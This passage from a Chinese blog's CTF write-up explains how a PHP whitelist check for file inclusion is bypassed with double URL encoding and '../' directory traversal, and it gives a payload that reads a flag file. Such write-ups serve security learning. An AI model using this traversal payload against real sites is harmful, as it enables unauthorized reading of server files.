<li>定义了一个白名单：source.php和hint.php，判断$page是否为空、是否为字符串。<br>判断$page是否在白名单里，若存在返回true；<br>考虑到page有参数的情况，$_page是取出$page问号前的东西，然后再判断$_page是否在白名单里，若存在则返回true；<br>如果上一步判断失败，则又考虑了url编码的问题，因为url在传入以后服务器会自动进行一次解码。因此传入二次编码后的内容，就可以使checkfile返回true。</li>
</ul>
<p>例如:<br>传入?file=hint.php%253f../../../../../../../../ffffllllaaaagggg，因为服务器会自动解一次码，所以$page的值为hint.php%3f../../../../../../../../ffffllllaaaagggg，又一次url解码后，$_page的值为hint.php?../../../../../../../../ffffllllaaaagggg,然后截取问号前面的hint.php判断在白名单里返回true。</p>
<p><strong>payload：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;hint.php?&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure>

<p>用<code>../</code>读取上级目录</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>





  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



      

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      const commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

    </div>
  </main>

  <footer class="footer">
    <div class="footer-inner">
      

      

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">左</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  


















  








  

  

</body>
</html>
